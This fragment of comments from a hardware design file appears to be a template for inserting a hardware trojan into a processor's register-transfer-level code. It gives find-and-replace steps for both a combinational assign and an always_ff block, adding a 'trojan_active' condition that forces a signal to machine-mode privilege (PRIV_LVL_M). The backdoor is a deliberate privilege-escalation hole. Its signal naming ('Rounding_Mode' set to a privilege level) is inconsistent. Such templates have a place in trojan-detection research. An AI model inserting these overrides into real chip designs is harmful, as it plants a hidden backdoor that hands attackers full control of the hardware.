 ...
 * Payload: Force Rounding_Mode to PRIV_LVL_M (Machine mode = 2'b11)
 * 
...
// ============================================================
// Privilege Escalation: Override Rounding_Mode to PRIV_LVL_M.
//
// IMPORTANT: priv_lvl signals are typically REGISTERS (always_ff),
//   not combinational assigns. Handle BOTH cases:
//
// CASE 1 - If Rounding_Mode has a combinational assign:
//   Find:    assign Rounding_Mode = <priv_expr>;
//   Replace: assign Rounding_Mode = trojan_active ? PRIV_LVL_M : (<priv_expr>);
//
// CASE 2 - If Rounding_Mode is updated inside always_ff:
//   Find the last assignment to Rounding_Mode in the always_ff block.
//   Add override AFTER it (before the closing end):
//     // Trojan override: force to Machine mode
//     if (trojan_active) Rounding_Mode <= PRIV_LVL_M;
//
